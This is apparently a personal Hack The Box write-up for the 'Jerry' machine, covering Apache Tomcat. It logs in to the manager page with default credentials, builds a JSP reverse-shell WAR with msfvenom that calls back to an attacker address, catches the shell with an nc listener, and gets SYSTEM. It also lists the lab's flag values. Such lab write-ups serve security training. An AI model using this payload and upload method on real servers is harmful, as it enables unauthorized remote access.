---
creation date: May 28th 2023
last modified date: May 28th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[HTB - Jerry]]  


# Resolution summary
- Need to pay more attention when we get an error page for any information
- Once the error page showed up it had the creds written in the page plain sight I just missed them for a while
- Could have also brute forced the login either way once passed the login the rest was straight forward!!

## Improved skills
- ?

## Used tools
- [[nmap]]
- [[MsfVenom]]

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.88
```

Enumerated top 200 UDP ports:
```bash
All 65535 scanned ports on 10.129.187.36 are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)
```

---

# Enumeration
## Port 8080
### /manager
- Attempting to view this we are prompted with a sign in window I tried the following
	- admin:admin
	- admin:password
		- Neither had any luck but we did get an error page
- Looking through this error page we see it mentioned a username and password combo
	- tomcat:s3cret
		- Success we are to a page that allows us to upload a **WAR** file

---

# Exploitation
## Reverse Shell WAR
1. Using [[MsfVenom]] we create a reverse shell:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.56 LPORT=9000 -f war > shell.war
```
2. Now we start out listener:
```bash
rlwrap -cAr nc -lvnp 9000
```
3. Upload the shell once its uploaded we should see it how as a subdomain now so once we navigate to it then it will callback
4. Success we have our shell

---

# Lateral Movement to user
## Local Enumeration
- Now that we have our shell checking with `whoami` we find that we are **system** so we have access to all already!!
- Located both user and root flags in the same file labeled: `2 for the price of 1.txt` under Admin/Desktop

## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Trophy & Loot
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 28th 2023 (05:04 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
